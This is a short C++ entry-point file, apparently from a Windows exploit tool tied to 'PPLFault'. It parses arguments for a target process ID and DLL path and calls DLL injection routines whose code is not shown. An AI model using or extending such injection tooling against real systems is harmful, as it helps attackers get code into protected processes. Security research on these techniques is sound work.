#include "exploit.h"
#include "PPLFault.h"

#include <iostream>

//#define VERSION1

BOOL g_bVerbose = FALSE;
BOOL g_bDebug = FALSE;
BOOL g_bForce = FALSE;
DWORD g_dwProcessId = 0;
LPWSTR g_pwszDllPath = NULL;
LPWSTR g_pwszProcessName = NULL;
LPWSTR g_pwszLogPipe = NULL;

int wmain(int argc, wchar_t* argv[])
{
    if (!ParseArguments(argc, argv))
        return 1;

    PrintArguments();

#ifdef VERSION1
	InjectDllv1(g_dwProcessId, g_pwszDllPath);
#else
	InjectDllv2(g_dwProcessId, g_pwszDllPath);
#endif

    return 0;
}
